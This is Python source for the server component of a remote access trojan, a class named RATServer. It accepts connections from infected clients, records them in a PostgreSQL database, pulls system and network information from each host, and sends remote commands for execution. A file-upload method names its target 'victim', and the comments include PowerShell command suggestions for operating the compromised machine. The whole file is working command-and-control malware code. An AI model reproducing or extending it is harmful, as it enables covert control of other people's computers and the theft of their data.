from fastapi import UploadFile
import socket
import select
import threading
import json
import difflib

from host.service.utilities import executeCommands
from host.service.classManager import SingletonMeta
from host.modules.Transmitter.transmitter import TransmitServer

from database.DataManager import PostgreSQLDataManager

from host.components.terminalStyles import *

class RATServer(metaclass=SingletonMeta):
    instance = None

    def __init__(self, host, port):
        if not RATServer.instance:
            RATServer.instance = self
            self.host = host
            self.port = port

            self.clients = {}

            self.trasmitter = TransmitServer("localhost", 4443)
            self.transmitter_thread = threading.Thread(target=self.trasmitter.start)
            self.transmitter_thread.start()

            # self.file_manager = FileTransferManager("localhost", 4440, "localhost", 4441)
            # self.file_upload_thread = threading.Thread(target=self.file_manager.start_upload_server)
            # self.file_upload_thread.start()
            # self.file_download_thread = threading.Thread(target=self.file_manager.start_download_server)
            # self.file_download_thread.start()

            # self.screen_share_manager = ScreenShareManager("localhost", 8095)
            # self.screen_share_thread = threading.Thread(target=self.screen_share_manager.connect)
            # self.screen_share_thread.start()

    def build_connection(self):
        # Change the database status of all clients to offline
        DataManager = PostgreSQLDataManager()
        DataManager.edit_all_status("Offline")
        DataManager.close_connection()

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((self.host, self.port))
        server_socket.listen(5)

        header(name="Server", message="Waiting for clients...")
        

        while True:
            try:
                DataManager = PostgreSQLDataManager()
                client, addr = server_socket.accept()
                self.clients[addr[0]] = client

                #print(f"[*] Connection established with {addr[0]}")
                header(name="Server", message=f"Connection established with {addr[0]}")

                # Start the function HandshakeEvent
                self.handshake_event(addr[0])
            except Exception as e:
                #print(f"Error building connection: {str(e)}")
                error(name="Server", message=f"Error building connection: {str(e)}")
                # remove the client from the list of clients
                self.clients.pop(addr[0])
                #print(f"[*] Client {addr[0]} disconnected")
                error(name="Server", message=f"Client {addr[0]} disconnected")
                try:
                    client_socket_ip = addr[0]
                except Exception as e:
                    # print(
                    #     f"Error updating client status: {str(e)}")
                    error(name="Server", message=f"Error updating client status: {str(e)}")
                break

    def receive_output(self, socket_ip, timeout=5, size=9216000):
        client_socket = self.clients[socket_ip]
        try:
            ready = select.select([client_socket], [], [], timeout)

            if ready[0]:
                try:
                    decoded = client_socket.recv(size).decode()
                    return decoded
                except:
                    return "Error decoding output"
            else:
                return "Error receiving output"
        except Exception as e:
            #print(f"Error receiving output: {str(e)}")
            error(name="Server", message=f"Error receiving output: {str(e)}")



    def execute(self, command_type, command, socket_ip):
        client_socket = self.clients[socket_ip]

        if client_socket is None:
            return "Error executing command"

        executeCommands(command_type, command, client_socket)
        #self.trasmitter.send_command(command_type, command, client_socket)


    async def transfer_file(self, victim, file: UploadFile):
        await self.file_manager.upload_file(victim, file)

    async def powershell_suggestions_terminal(self, victim, command):
        # Read the JSON data from the file
        with open("data/PowerShellCommands.json", "r") as data_file:
            data = json.load(data_file)

        # Extract the list of command names from the JSON data
        command_names = [entry["Name"] for entry in data]

        # Find the closest matches to the user input
        closest_matches = difflib.get_close_matches(
            command, command_names, n=5, cutoff=0.6)

        # Return the closest matches as suggestions
        # For the matches, get the full command from the JSON data just filter the matches
        closest_matches = [entry for entry in data if entry["Name"]
                           in closest_matches]

        return closest_matches

    def handshake_event(self, socket_ip):
        # Handshake event to verify the user and establish the connection.

        socket_client = self.clients[socket_ip]

        # Send a verification request
        socket_client.send("verify".encode())

        # Receive the response from the client
        response = self.receive_output(socket_ip)

        if response is None:
            # The user failed to verify, close the connection
            self.close_connection(socket_ip)
            return

        # Parse the response as JSON
        try:
            response_data = json.loads(response)
            user_id = response_data.get("ID")
        except json.JSONDecodeError:
            self.close_connection(socket_ip)
            return

        if not response_data:
            # The user failed to verify, close the connection
            self.close_connection(socket_ip)
            return

        # Check if the user exists in the database
        DataManager = PostgreSQLDataManager()
        user_exists = DataManager.user_exists(user_id)

        if user_exists:
            
            socket_client.send(json.dumps({"ID": user_id}).encode())

            # Gather Information

            socket_client.send(json.dumps({"type": "information", "part": "system_info"}).encode())

            system_info = self.receive_output(socket_ip)
            system_info = json.loads(system_info)

            # Network Information
            socket_client.send(json.dumps({"type": "information", "part": "network_info"}).encode())
            network_info = self.receive_output(socket_ip)
            network_info = json.loads(network_info)

            data = {
                "System Info": system_info["data"],
                "Network Info": network_info["data"]
            }
            
            socket_client.send(json.dumps({"ended": True}).encode())

            DataManager.update_data(user_id, json.dumps(data))
            DataManager.change_status(user_id, "Online")
            DataManager.close_connection()
            

        else:
            user_id = DataManager._generate_client_id()
            # Send the user ID to the client
            socket_client.send(json.dumps({"ID": user_id}).encode())

            socket_client.send(json.dumps({"type": "information", "part": "system_info"}).encode())
            # Receive the data like we did before
            system_info = json.loads(self.receive_output(socket_ip))


            data = {
                "System Info": system_info["data"]
                # Add more data retrieval commands here
            }
            print("Data in the server: ", data)
            socket_client.send(json.dumps({"ended": True}).encode())

            DataManager.insert_data(user_id, json.dumps(data), socket_ip)
            DataManager.change_status(user_id, "Online")
            DataManager.close_connection()
            

    def close_connection(self, socket_ip):
        # Close the connection with the client
        try:
            self.clients[socket_ip].close()
        except:
            pass
        self.clients.pop(socket_ip)